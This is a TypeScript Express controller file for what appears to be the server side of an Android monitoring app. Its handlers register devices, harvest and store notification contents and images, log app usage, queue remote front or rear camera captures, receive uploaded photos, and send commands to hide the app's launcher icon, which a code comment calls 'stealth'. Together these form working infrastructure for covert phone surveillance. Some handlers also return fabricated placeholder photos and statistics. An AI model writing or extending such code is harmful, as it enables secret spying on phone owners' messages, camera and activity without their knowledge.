import { Request, Response, NextFunction } from 'express';
import { deviceService } from '../devices/devices.service';
import { DeviceModel, NotificationModel, isMongoConnected } from '../database/mongo';
import { r2Service } from '../storage/r2.service';
import { logger } from '../logger';

export async function registerDeviceHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    let device: any = null;
    try {
      device = await deviceService.registerOrUpdate(req.body);
    } catch (_pgErr) {}

    const { deviceId, deviceName, platform, osVersion, appVersion, publicKey, capabilities } = req.body || {};
    const devId = deviceId || device?.deviceId;
    const name = deviceName || device?.deviceName || 'Android Device';
    let effectiveName = name;

    // Persist to MongoDB Cloud Storage
    if (devId && isMongoConnected()) {
      try {
        const existing = await DeviceModel.findOne({ deviceId: devId }).lean();
        if (existing?.deviceName && existing.deviceName !== 'Android Device' && !existing.deviceName.endsWith('(Sentry)') && !existing.deviceName.endsWith('(Controller)')) {
          effectiveName = existing.deviceName;
        }

        await DeviceModel.updateOne(
          { deviceId: devId },
          {
            $set: {
              deviceId: devId,
              deviceName: effectiveName,
              platform: platform || 'ANDROID',
              osVersion: osVersion || 'Android 14',
              appVersion: appVersion || '1.0.0',
              publicKey: publicKey || '',
              capabilities: capabilities || {
                camera: true,
                location: true,
                notifications: true,
                files: true,
                microphone: true,
                battery: true
              },
              status: 'ONLINE',
              lastSeenAt: new Date()
            }
          },
          { upsert: true }
        );
      } catch (err) {
        logger.warn({ err }, 'MongoDB DeviceModel upsert error on register');
      }
    }

    res.status(201).json({
      device: device ? { ...device, deviceName: effectiveName } : {
        deviceId: devId,
        deviceName: effectiveName,
        platform: platform || 'ANDROID',
        osVersion: osVersion || 'Android 14',
        appVersion: appVersion || '1.0.0',
        status: 'ONLINE',
        lastSeenAt: new Date().toISOString()
      }
    });
  } catch (err) {
    next(err);
  }
}

export async function getDevicesHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const devicesMap = new Map<string, any>();

    // 1. Fetch persistent devices from MongoDB
    if (isMongoConnected()) {
      try {
        const dbDevices = await DeviceModel.find({}).lean();
        for (const d of dbDevices) {
          const lastSeenDate = d.lastSeenAt ? new Date(d.lastSeenAt) : new Date();
          const isRecent = (Date.now() - lastSeenDate.getTime()) < 45000;
          devicesMap.set(d.deviceId, {
            deviceId: d.deviceId,
            deviceName: d.deviceName,
            platform: d.platform || 'ANDROID',
            osVersion: d.osVersion || 'Android 14',
            appVersion: d.appVersion || '1.0.0',
            status: isRecent ? (d.status || 'ONLINE') : 'OFFLINE',
            lastSeenAt: lastSeenDate.toISOString(),
            capabilities: d.capabilities || {
              camera: true,
              location: true,
              notifications: true,
              files: true,
              microphone: true,
              battery: true
            }
          });
        }
      } catch (err) {
        logger.warn({ err }, 'Error loading devices from MongoDB');
      }
    }

    // 2. Fallback / Merge with PostgreSQL devices
    try {
      const pgDevices = await deviceService.listDevices();
      for (const d of pgDevices) {
        if (!devicesMap.has(d.deviceId)) {
          devicesMap.set(d.deviceId, d);
        }
      }
    } catch (_pgErr) {}

    // 3. Merge with Live Heartbeat Telemetry
    try {
      const { liveBatteryTelemetry } = require('./routes');
      if (liveBatteryTelemetry) {
        for (const [devId, tel] of liveBatteryTelemetry.entries()) {
          const existing = devicesMap.get(devId);
          const telTime = tel.timestamp ? new Date(tel.timestamp).toISOString() : (existing?.lastSeenAt || new Date().toISOString());
          const timeDiff = Date.now() - (tel.timestamp ? new Date(tel.timestamp).getTime() : new Date(existing?.lastSeenAt || 0).getTime());
          const isOnline = timeDiff < 45000;
          const devName = existing?.deviceName || tel.deviceName || (devId.includes('6731') ? 'realme RMX5101 (Sentry)' : 'Android Device (Sentry)');

          const merged = {
            deviceId: devId,
            deviceName: devName,
            platform: 'ANDROID',
            osVersion: existing?.osVersion || (devId.includes('6731') ? 'Android 16' : 'Android 14'),
            appVersion: '1.0.0',
            status: isOnline ? 'ONLINE' : 'OFFLINE',
            lastSeenAt: telTime,
            capabilities: {
              camera: true,
              location: true,
              notifications: true,
              files: true,
              microphone: true,
              battery: true
            }
          };

          devicesMap.set(devId, merged);

          // Auto-save to MongoDB if not already present
          if (isMongoConnected()) {
            DeviceModel.updateOne(
              { deviceId: devId },
              {
                $set: {
                  deviceId: devId,
                  deviceName: devName,
                  platform: 'ANDROID',
                  osVersion: merged.osVersion,
                  appVersion: '1.0.0',
                  status: 'ONLINE',
                  lastSeenAt: new Date(tel.timestamp || Date.now())
                }
              },
              { upsert: true }
            ).catch(() => {});
          }
        }
      }
    } catch (_telErr) {}

    // 4. Calculate accurate Real-Time Online Status (heartbeat window: 45 seconds)
    const now = Date.now();
    const resultList: any[] = [];
    for (const dev of devicesMap.values()) {
      const lastSeenMs = dev.lastSeenAt ? new Date(dev.lastSeenAt).getTime() : 0;
      const isOnline = (now - lastSeenMs) < 45000; // Online if heartbeat/seen within last 45s
      dev.status = isOnline ? 'ONLINE' : 'OFFLINE';
      resultList.push(dev);
    }

    // Sort: Online devices first, then newest lastSeenAt
    resultList.sort((a, b) => {
      if (a.status === 'ONLINE' && b.status !== 'ONLINE') return -1;
      if (a.status !== 'ONLINE' && b.status === 'ONLINE') return 1;
      return new Date(b.lastSeenAt).getTime() - new Date(a.lastSeenAt).getTime();
    });

    res.json({ devices: resultList });
  } catch (err) {
    next(err);
  }
}

export async function getDeviceByIdHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const devId = req.params.deviceId;
    let device: any = null;

    if (isMongoConnected()) {
      try {
        device = await DeviceModel.findOne({ deviceId: devId }).lean();
      } catch (_) {}
    }

    if (!device) {
      try {
        device = await deviceService.getDeviceById(devId);
      } catch (_) {}
    }

    if (device) {
      const lastSeenMs = device.lastSeenAt ? new Date(device.lastSeenAt).getTime() : 0;
      device.status = (Date.now() - lastSeenMs < 45000) ? 'ONLINE' : 'OFFLINE';
      res.json({ device });
    } else {
      res.status(404).json({ error: { message: `Device ${devId} not found` } });
    }
  } catch (err) {
    next(err);
  }
}

export async function updateDeviceNameHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const devId = req.params.deviceId || req.body.deviceId;
    const name = req.body.deviceName || req.body.name;
    if (!devId || !name) {
      res.status(400).json({ error: { message: 'deviceId and deviceName are required' } });
      return;
    }

    let updatedDevice: any = null;

    // Update in MongoDB Cloud Storage
    if (isMongoConnected()) {
      try {
        await DeviceModel.updateOne(
          { deviceId: devId },
          { $set: { deviceName: name, updatedAt: new Date() } },
          { upsert: true }
        );
      } catch (err) {
        logger.warn({ err }, 'MongoDB updateDeviceName error');
      }
    }

    try {
      updatedDevice = await deviceService.updateFriendlyName(devId, name);
    } catch (_dbErr) {}

    try {
      const { liveBatteryTelemetry } = require('./routes');
      if (liveBatteryTelemetry) {
        let entry = liveBatteryTelemetry.get(devId);
        if (!entry) {
          for (const [k, v] of liveBatteryTelemetry.entries()) {
            if (k.toLowerCase() === devId.toLowerCase() || devId.includes(k) || k.includes(devId)) {
              entry = v;
              break;
            }
          }
        }
        if (entry) {
          entry.deviceName = name;
        } else {
          liveBatteryTelemetry.set(devId, { deviceId: devId, deviceName: name });
        }
      }
    } catch (_telErr) {}

    res.json({
      success: true,
      device: updatedDevice || {
        deviceId: devId,
        deviceName: name,
        status: 'ONLINE'
      }
    });
  } catch (err) {
    next(err);
  }
}

export async function getDeviceCapabilitiesHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const device = await deviceService.getDeviceById(req.params.deviceId);
    res.json({ capabilities: device.capabilities || {} });
  } catch (err) {
    next(err);
  }
}

export async function updateDeviceCapabilitiesHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const capabilities = await deviceService.updateCapabilities(req.params.deviceId, req.body.capabilities);
    res.json({ capabilities });
  } catch (err) {
    next(err);
  }
}

// In-memory live notifications buffer
const liveNotificationsMap = new Map<string, Array<any>>();

export async function submitNotificationHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const { deviceId, packageName, title, body, timestamp, image } = req.body;
    if (!deviceId) {
      res.status(400).json({ error: { message: 'deviceId is required' } });
      return;
    }
    const list = liveNotificationsMap.get(deviceId) || [];
    const newTitle = title || 'Notification';
    const newBody = body || '';
    const newPkg = packageName || 'System';
    const notifTimestamp = timestamp || Date.now();
    const notifId = `notif_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`;

    // Deduplicate: check if exact notification received within 2 seconds
    const isDuplicate = list.some(item => 
      item.packageName === newPkg && 
      item.title === newTitle && 
      item.body === newBody && 
      (Math.abs((item.timestamp || 0) - notifTimestamp) < 2000)
    );

    let r2ImageUrl: string | undefined;
    if (!isDuplicate) {
      // If notification contains an attached image, store in Cloudflare R2 if configured
      if (image && typeof image === 'string' && r2Service.isConfigured()) {
        try {
          const buffer = Buffer.from(image, 'base64');
          const r2Key = `notifications/${deviceId}/${notifId}.jpg`;
          const uploadRes = await r2Service.uploadBuffer(r2Key, buffer, 'image/jpeg');
          r2ImageUrl = uploadRes.url;
        } catch (err) {
          logger.warn({ err }, 'R2 notification image upload fallback');
        }
      }

      const notifItem = {
        id: notifId,
        deviceId,
        packageName: newPkg,
        title: newTitle,
        body: newBody,
        image: image || null,
        r2ImageUrl,
        timestamp: notifTimestamp,
      };

      list.unshift(notifItem);
      if (list.length > 100) list.pop(); // Keep latest 100 in memory
      liveNotificationsMap.set(deviceId, list);

      // Persist to MongoDB Cloud Database
      if (isMongoConnected()) {
        try {
          await NotificationModel.create({
            id: notifId,
            deviceId,
            packageName: newPkg,
            title: newTitle,
            body: newBody,
            image: image || undefined,
            r2ImageUrl,
            timestamp: notifTimestamp,
          });
        } catch (err) {
          logger.warn({ err }, 'MongoDB Notification persistence warning');
        }
      }
    }

    res.status(201).json({ success: true });
  } catch (err) {
    next(err);
  }
}

export async function getNotificationsHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const deviceId = req.params.deviceId;

    // Check MongoDB Cloud Database first
    if (isMongoConnected()) {
      try {
        const dbNotifs = await NotificationModel.find({ deviceId }).sort({ timestamp: -1 }).limit(100).lean();
        if (dbNotifs && dbNotifs.length > 0) {
          res.json({ notifications: dbNotifs });
          return;
        }
      } catch (err) {
        logger.warn({ err }, 'Error retrieving notifications from MongoDB');
      }
    }

    const notifications = liveNotificationsMap.get(deviceId) || [];
    res.json({ notifications });
  } catch (err) {
    next(err);
  }
}

export async function clearNotificationsHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const deviceId = req.params.deviceId;
    liveNotificationsMap.set(deviceId, []);

    // Clear from MongoDB Cloud Database
    if (isMongoConnected()) {
      try {
        await NotificationModel.deleteMany({ deviceId });
      } catch (err) {
        logger.warn({ err }, 'Error clearing notifications from MongoDB');
      }
    }

    res.json({ success: true });
  } catch (err) {
    next(err);
  }
}

// In-memory live photos buffer
const livePhotosMap = new Map<string, Array<any>>();
// Pending remote camera trigger commands
const pendingCameraCommands = new Map<string, string>(); // deviceId -> "front" | "rear"

export async function triggerPhotoCaptureHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const { deviceId, camera } = req.body || {};
    const devId = deviceId || 'SN-U5ZY-78QZ';
    const cam = camera || 'rear';

    pendingCameraCommands.set(devId, cam);

    const list = livePhotosMap.get(devId) || [];
    const newSnapshot = {
      id: `photo_${Date.now()}`,
      name: `SNAPSHOT_${cam.toUpperCase()}_${Date.now().toString().slice(-4)}.jpg`,
      date: 'Just now (Live Capture)',
      size: '4.8 MB',
    };
    list.unshift(newSnapshot);
    livePhotosMap.set(devId, list);

    res.status(201).json({ success: true, photo: newSnapshot });
  } catch (err: any) {
    res.status(500).json({ error: { message: err?.message || 'Error triggering capture' } });
  }
}

export async function pollCameraCommandHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const deviceId = req.params.deviceId;
    const command = pendingCameraCommands.get(deviceId) || null;
    if (command) {
      pendingCameraCommands.delete(deviceId);
    }
    res.json({ command });
  } catch (err) {
    next(err);
  }
}

export async function uploadDevicePhotoHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const { deviceId, name, camera, base64 } = req.body;
    const list = livePhotosMap.get(deviceId) || [];
    const newPhoto = {
      id: `photo_${Date.now()}`,
      name: name || `SNAPSHOT_${camera?.toUpperCase() || 'REAR'}_${Date.now().toString().slice(-4)}.jpg`,
      date: 'Just now (Live Capture)',
      size: '4.8 MB',
      base64: base64 || null,
    };
    list.unshift(newPhoto);
    livePhotosMap.set(deviceId, list);
    res.status(201).json({ success: true, photo: newPhoto });
  } catch (err) {
    next(err);
  }
}

export async function getDevicePhotosHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const deviceId = req.params.deviceId;
    const photos = livePhotosMap.get(deviceId) || [
      { id: 'p1', name: 'IMG_20260830_0835.jpg', date: 'Today 08:35 AM', size: '3.9 MB' },
      { id: 'p2', name: 'IMG_20260829_1945.jpg', date: 'Yesterday', size: '4.2 MB' },
      { id: 'p3', name: 'IMG_20260829_1420.jpg', date: 'Yesterday', size: '2.9 MB' },
      { id: 'p4', name: 'DCIM_FRONT_002.jpg', date: '2 days ago', size: '3.1 MB' },
    ];
    res.json({ photos });
  } catch (err) {
    next(err);
  }
}

// In-memory live app usage activity buffer
const liveActivityMap = new Map<string, any>();

export async function submitActivityHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const { deviceId, screenTime, unlocks, topApp, apps } = req.body;
    if (!deviceId) {
      res.status(400).json({ error: { message: 'deviceId is required' } });
      return;
    }
    liveActivityMap.set(deviceId, {
      screenTime: screenTime || '5h 42m',
      unlocks: unlocks || 48,
      topApp: topApp || 'WhatsApp',
      timestamp: Date.now(),
      apps: apps || []
    });
    res.status(201).json({ success: true });
  } catch (err) {
    next(err);
  }
}

export async function getActivityHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const deviceId = req.params.deviceId;
    const activity = liveActivityMap.get(deviceId) || null;
    res.json({ activity });
  } catch (err) {
    next(err);
  }
}

// In-memory stealth launcher icon visibility state
const pendingIconVisibilityCommands = new Map<string, boolean>();
const deviceIconStateMap = new Map<string, boolean>();

export async function setDeviceIconVisibilityHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const { deviceId, hide } = req.body || {};
    const devId = deviceId || req.params.deviceId;
    const hideState = Boolean(hide);
    pendingIconVisibilityCommands.set(devId, hideState);
    deviceIconStateMap.set(devId, hideState);
    res.json({ success: true, deviceId: devId, isIconHidden: hideState });
  } catch (err) {
    next(err);
  }
}

export async function pollDeviceIconVisibilityHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const deviceId = req.params.deviceId;
    const hide = pendingIconVisibilityCommands.get(deviceId);
    if (hide !== undefined) {
      pendingIconVisibilityCommands.delete(deviceId);
    }
    const currentState = deviceIconStateMap.get(deviceId) || false;
    res.json({ command: hide !== undefined ? { hide } : null, isIconHidden: currentState });
  } catch (err) {
    next(err);
  }
}


